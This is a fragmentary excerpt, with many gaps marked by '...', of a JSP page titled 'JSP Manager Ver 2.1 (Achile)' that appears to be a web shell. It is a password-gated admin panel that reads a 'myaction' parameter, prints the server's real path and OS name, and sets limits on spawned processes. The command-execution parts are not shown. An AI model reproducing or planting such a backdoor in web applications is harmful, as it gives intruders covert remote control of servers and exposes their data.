...
<%!
	...
	private static final long MAX_PROCESS_RUNNING_TIME =  60 * 1000; //60 seconds
	//Button names
    ...
    <tr>
      <td class="tr1">
        <TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
          <tr>
            <TD align="left"><FONT face="webdings" color="#ffffff">&nbsp;</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>AdminLogin :::...</b></font></TD>
            <TD align="right"><FONT color="#d2d8ec"><b>JSP Manager</b>Ver 2.1<b>(Achile)</b></FONT></TD>
          </tr>
...
else
{
	...
	if (session.getAttribute("password") == null) 
	{
		...
		if (validate(password) == false) 
		{
			...
			out.println("<div align=\"center\"><font color=\"red\"><li>Shit!Password Is Wrong!</font></div>");		
			out.close();
		}
		else
		{
	...
	if (request.getParameter("myaction") == null)
		...
		action = (String)request.getParameter("myaction");
...
%>
current:<%out.println(request.getRealPath("/"));%><br>
os:<%out.println(System.getProperty("os.name"));%><br>
Logout<% out.println("<a href=?myaction=exit>Click</a>");%><br><br>
<%
